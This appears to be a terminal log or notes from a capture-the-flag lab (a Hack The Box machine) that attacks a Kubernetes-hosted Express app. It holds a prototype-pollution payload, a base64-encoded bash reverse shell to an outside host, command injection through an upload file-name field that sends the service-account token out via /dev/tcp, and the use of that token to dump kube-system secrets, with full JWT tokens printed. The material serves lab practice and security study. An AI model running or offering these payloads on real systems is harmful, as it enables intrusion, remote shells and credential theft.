Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          <none>

root@webapp-deployment-5d764566f4-mbprj:/tmp# curl --silent -I http://172.17.0.6:3000
<mbprj:/tmp# curl --silent -I http://172.17.0.6:3000
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 2
ETag: W/"2-l9Fw4VUO7kr8CvBlt4zaMCqXZ0w"
Date: Tue, 13 Apr 2021 20:57:18 GMT
Connection: keep-alive
Keep-Alive: timeout=5

root@webapp-deployment-5d764566f4-mbprj:/tmp# curl -X POST -I --silent http://172.17.0.6:3000/todo
<url -X POST -I --silent http://172.17.0.6:3000/todo
HTTP/1.1 403 Forbidden
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 36
ETag: W/"24-IhatdJwM9QKCZm87pxuBHiOglA8"
Date: Tue, 13 Apr 2021 20:58:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5

root@webapp-deployment-5d764566f4-mbprj:/tmp# curl --silent -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":"hello","__proto__":{"canUpload": 1}}}' -X PUT http://172.17.0.6:3000/

{"ok":true}

$ echo 'bash -c "bash -i >& /dev/tcp/172.17.0.8/6969 >&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC44LzY5NjkgPiYxIgo=

root@webapp-deployment-5d764566f4-mbprj:/tmp# curl --silent -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"; echo YmFzaCAtYyAiY2F0IC9ydW4vc2VjcmV0cy9rdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3Rva2VuID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjgvNjk2OSA+JjEiCg==|base64 -d|bash"}' -X POST http://172.17.0.6:3000/upload

root@webapp-deployment-5d764566f4-mbprj:/tmp# curl --silent -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"; cat /run/secrets/kubernetes.io/serviceaccount/token > /dev/tcp/172.17.0.8/6969\""}' -X POST http://172.17.0.6:3000/upload

root@webapp-deployment-5d764566f4-mbprj:/tmp# ./kctl --token $token --namespace kube-system get secrets

NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      86d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      86d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      86d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      86d
clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      86d
coredns-token-dbp92                              kubernetes.io/service-account-token   3      86d
cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      86d
daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      86d
default-token-l85f2                              kubernetes.io/service-account-token   3      86d
deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      86d
disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      86d
endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      86d
endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      86d
endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      86d
expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      86d
generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      86d
horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      86d
job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      86d
kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      86d
namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      86d
node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      86d
persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      86d
pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      86d
pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      86d
pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      86d
replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      86d
replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      86d
resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      86d
root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      86d
service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      86d
service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      86d
statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      86d
storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      86d
token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      86d
ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      86d

root@webapp-deployment-5d764566f4-mbprj:/tmp# ./kctl --token $token --namespace kube-system describe secret deployment-controller-token-cwgst
<m describe secret deployment-controller-token-cwgst
Name:         deployment-controller-token-cwgst
Namespace:    kube-system
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: deployment-controller
              kubernetes.io/service-account.uid: e8bf8305-0a08-4379-9994-3a7cd9ef08e1

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     1066 bytes
namespace:  11 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZXBsb3ltZW50LWNvbnRyb2xsZXItdG9rZW4tY3dnc3QiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVwbG95bWVudC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiZThiZjgzMDUtMGEwOC00Mzc5LTk5OTQtM2E3Y2Q5ZWYwOGUxIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRlcGxveW1lbnQtY29udHJvbGxlciJ9.I1p1KG7YMZ0eq3PUyHLEQ8yNSSpcSALdfAY6K_Pga2B4cqXGoqhR_RnbDbWRYg4rIHtlrOfFss_EjiWnLAUHPuwZZchpc-JxGRmSpSbHfCi9E5N071a5G3UQ87khmr1S6R5_FoMlT6w_KfejbzL6EoqqU5nVJwMOZAxA4IMmSTGsOm5MgHYS8AMKLjRIo6yR_YDgUqPcsRM1DmqjSVf51dOw0CqNre3NaahuWrPRwlpUcVnKQeXJFp-kxsDU5A6yguHLbFf5kBLmNGzbCVh21AGLqWF2YAzMZTwVGKA1z2T4OcLSbpHZjRy8s3ZhmbepmUEhN8_3fvHYiaKdj0HLpw

root@webapp-deployment-5d764566f4-mbprj:/tmp# ./kctl --token $token --namespace kube-system  describe secrets default-token-l85f2
<e kube-system  describe secrets default-token-l85f2
Name:         default-token-l85f2
Namespace:    kube-system
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: default
              kubernetes.io/service-account.uid: aa8483eb-d3fb-40d4-a4fd-32e89c205f6b

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     1066 bytes
namespace:  11 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZWZhdWx0LXRva2VuLWw4NWYyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImRlZmF1bHQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJhYTg0ODNlYi1kM2ZiLTQwZDQtYTRmZC0zMmU4OWMyMDVmNmIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06ZGVmYXVsdCJ9.j3QRNw65e7gOsZyv_5lS35bQOBVd05EvEVgt5iKvGQoOdcaFm5tBjbawYzSB6gPSb03etjX4GIEgJZp_8aBbKGiaLCUSV6Re8-BoCTDorKd9noRdsE17algfzwd2RW6qeNjm0ybF7XC8Eo29Fe331Xgm1jV4VFIFB56YYaVjFYhBcaliv4xaHVaAurWSRe3FlDA78LGx3upQ1dpyfaXR1xvOSGVOtCRLtlKwto_YQ_zi03hCLRzoa9MGRu6wkpG1YKcA9fqc7ag4l5hdmYR14Z6Wi7sDFvgMClJy_IBtm7tM8XRQ-7AQC1atUs5MaviW4mZcGpwM5-06CiLgRMGOTQ

root@webapp-deployment-5d764566f4-mbprj:/tmp# ./kctl --token $token --namespace kube-system get roles
<tl --token $token --namespace kube-system get roles
NAME                                             CREATED AT
extension-apiserver-authentication-reader        2021-01-17T07:10:53Z
kube-proxy                                       2021-01-17T07:10:56Z
kubeadm:kubelet-config-1.20                      2021-01-17T07:10:54Z
kubeadm:nodes-kubeadm-config                     2021-01-17T07:10:54Z
secrets-view                                     2021-01-17T19:01:33Z
system::leader-locking-kube-controller-manager   2021-01-17T07:10:53Z
system::leader-locking-kube-scheduler            2021-01-17T07:10:53Z
system:controller:bootstrap-signer               2021-01-17T07:10:53Z
system:controller:cloud-provider                 2021-01-17T07:10:53Z
system:controller:token-cleaner                  2021-01-17T07:10:53Z
system:persistent-volume-provisioner             2021-01-17T07:10:59Z

$ curl --silent -k -H "Authorization: Bearer $token" https://unobtainium.htb:8443/apis/rbac.authorization.k8s.io/v1/roles > rbac_roles

root@webapp-deployment-5d764566f4-mbprj:/tmp# ./kctl --token $token --namespace kube-system describe secrets replication-controller
<kube-system describe secrets replication-controller
Name:         replication-controller-token-jz8k8
Namespace:    kube-system
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: replication-controller
              kubernetes.io/service-account.uid: a785af91-a2ff-41fa-ad7f-688c0ee42b1b

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     1066 bytes
namespace:  11 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJyZXBsaWNhdGlvbi1jb250cm9sbGVyLXRva2VuLWp6OGs4Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InJlcGxpY2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJhNzg1YWY5MS1hMmZmLTQxZmEtYWQ3Zi02ODhjMGVlNDJiMWIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06cmVwbGljYXRpb24tY29udHJvbGxlciJ9.lbUjkDsY_B8GhgvAIOXW6olyhNSzmJAJtDh0Jfc2RFMErenHEG9KuFnY-ufyhNSqf10_5Lb_fkz2-Sg3YIcxksghFzGIMote1GktWNAHCKslMqUfnv7x48lp1Nzhy7zvhNe-EVEdYRUpOXxdI5YdKPVVNBFUwStqfKuNThFB6lsyGFxynMUIK5Oqu2hvV4afhaja9WKZWxi2drUvHgDJYylbach1WMf_jWc7SIYhxpd8oYi84HUxpj2tlQHa1L4gy0XTFgvoeEY-NhllQ2vsimMQEvQRTeUVdoA0l1YVWkPb4SnIQR6cI3hmpxRlY3bxUIVr9-_fo6Zt3D2IFik0nA

---
---

- https://github.com/Kirill89/prototype-pollution-explained
- https://support.workiva.com/hc/en-us/articles/360051664152-Google-Cloud-Storage-Commands
- https://gist.github.com/mikesparr/e6c29f190ea3ad88f12b39a9ac75e815
- https://raesene.github.io/blog/2017/05/01/Kubernetes-Security-etcd/
- https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3